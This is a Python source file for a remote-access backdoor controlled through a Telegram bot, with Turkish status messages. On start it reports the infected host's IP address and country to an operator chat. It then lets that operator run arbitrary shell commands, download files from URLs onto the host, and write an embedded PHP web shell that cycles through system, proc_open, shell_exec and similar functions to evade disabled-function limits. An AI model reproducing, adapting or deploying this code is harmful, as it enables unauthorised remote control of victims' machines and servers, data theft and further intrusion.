from telegram.ext import Updater, CommandHandler
import os, sys
import requests
import subprocess

TOKEN = 'TELEGRAM-BOT-TOKEN'
xshell = '''<?php if(isset($_REQUEST["cmd"])){$c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);$z=@ini_get("disable_functions");if(!empty($z)){$z=preg_replace("/[, ]+/",',',$z);$z=explode(',',$z);$z=array_map("trim",$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f("system")){ob_start();system($c);$w=ob_get_clean();}elseif(f("proc_open")){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f("shell_exec")){$w=shell_exec($c);}elseif(f("passthru")){ob_start();passthru($c);$w=ob_get_clean();}elseif(f("popen")){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f("exec")){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}echo"<pre>$w</pre>";} ?>'''
TARGET_USER_ID = 'USER-ID'
updater = Updater(token=TOKEN, use_context=True)

def write_to_file(file_path, text):
    with open(file_path, 'a') as file:
        file.write(str(text))

def download_file(url, destination):
    response = requests.get(url)
    if response.status_code == 200:
        with open(destination, 'wb') as file:
            file.write(response.content)
        return '1'
    else:
        return '0'

def get_network():
    ip_response = requests.get("http://ip-api.com/json/")
    ip_data = ip_response.json()
    data = {}
    data['ip'] = ip_data['query']
    data['country'] = ip_data['countryCode']
    return data

def get_ip():
    data = get_network()
    return data['ip']

def get_country():
    data = get_network()
    return data['country']

def start():
    commands = 'Komutlar:\n/cmd <command>\n/shell <shell-to-upload>\n/shell <file-to-upload>\n/stop'
    ip = get_ip()
    country = get_country()
    message = {
        "chat_id": TARGET_USER_ID,
        "text": f'Yeni log dustu\nip: `{ip}`\nlokasyon: `{country}`',
        #"text": f'Yeni log dustu',
        "parse_mode": "Markdown"
        }
    response = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data=message)

def help(update, context):
    user_id = str(update.effective_user.id)
    if user_id == TARGET_USER_ID:
        context.bot.send_message(chat_id=update.effective_chat.id, text='Komutlar:\n/cmd <command>\n/shell <shell-to-upload>\n/shell <file-to-upload>\n/stop')
    else:
        return

def cmd(update, context):
    user_id = str(update.effective_user.id)
    if user_id == TARGET_USER_ID:
        command = update.message.text.split(' ')
        command = ' '.join(command[1:])
        output = subprocess.check_output(command, shell=True, text=True)
        context.bot.send_message(chat_id=update.effective_chat.id, text=output)
    else:
        return

def shell(update, context):
    user_id = str(update.effective_user.id)
    if user_id == TARGET_USER_ID:
        to_shell = update.message.text.split(' ')[1]
        try:
            write_to_file(to_shell, xshell)
            message = f'shell basariyla yuklendi konum {to_shell}'
            context.bot.send_message(chat_id=update.effective_chat.id, text=message)
        except:
            message = f'shell yuklenemedi konum {to_shell}'
            context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    else:
        return
    
def upload_file(update, context):
    user_id = str(update.effective_user.id)
    if user_id == TARGET_USER_ID:
        konum = update.message.text.split(' ')[1]
        url= update.message.text.split(' ')[2]
        try:
            x = download_file(url, konum)
            if x == '1':
                message = f'dosya basariyla yuklendi konum {konum}'
                context.bot.send_message(chat_id=update.effective_chat.id, text=message)
            else:
                message = f'dosya yuklenemedi konum {konum}'
                context.bot.send_message(chat_id=update.effective_chat.id, text=message)
        except:
            message = f'dosya yuklenemedi konum {konum}'
            context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    else:
        return

def stop(update, context):
    user_id = str(update.effective_user.id)
    if user_id == TARGET_USER_ID:
        context.bot.send_message(chat_id=update.effective_chat.id, text='backdoor kapaniyor')
        updater.stop()
    else:
        return


def main():
    dispatcher = updater.dispatcher
    shell_handler = CommandHandler('shell', shell)
    stop_handler = CommandHandler('stop', stop)
    upload_handler = CommandHandler('upload', upload_file)
    cmd_handler = CommandHandler('cmd', cmd)
    help_handler = CommandHandler('help', help)
    dispatcher.add_handler(help_handler)
    dispatcher.add_handler(cmd_handler)
    dispatcher.add_handler(upload_handler)
    dispatcher.add_handler(shell_handler)
    dispatcher.add_handler(stop_handler)
    updater.start_polling()
    updater.idle()

start()
if __name__ == '__main__':
    main()
